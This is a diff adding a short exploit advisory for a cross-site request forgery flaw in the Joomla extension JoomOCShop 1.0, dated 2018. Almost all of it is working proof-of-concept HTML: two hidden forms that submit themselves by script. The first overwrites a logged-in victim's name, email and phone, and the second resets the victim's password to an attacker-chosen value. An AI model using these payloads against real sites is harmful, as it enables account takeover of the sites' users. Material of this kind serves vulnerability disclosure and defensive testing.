@@ -1,0 +1,40 @@
+# Exploit Title: Joomla! extension JoomOCShop 1.0 - Cross site request forgery
+# Date: 2018-05-28
+# Exploit Author: L0RD or borna.nematzadeh123@gmail.com
+# Software Link: https://extensions.joomla.org/extensions/extension/e-commerce/e-commerce-integrations/joomocshop/
+# Vendor Homepage: https://www.joomlaextensions.co.in/
+# Version: 1.0
+# Tested on: Kali linux
+===================================================
+
+# POC :
+
+# Change user information exploit :
+
+<html>
+  <body>
+    <form action="http://site.com/joomoc2/?route=account/edit" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="firstname" value="decode" />
+      <input type="hidden" name="lastname" value="revenge" />
+      <input type="hidden" name="email" value="decod3&#46;n&#64;gmail&#46;com" />
+      <input type="hidden" name="telephone" value="100000" />
+      <input type="hidden" name="fax" value="&#13;" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+# Change password exploit :
+
+<form action="http://site.com/jcart/account/password.html" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="password" value="test" />
+      <input type="hidden" name="confirm" value="test" />
+</form>
+<script>
+   document.forms[0].submit();
+</script>
+
+====================================================
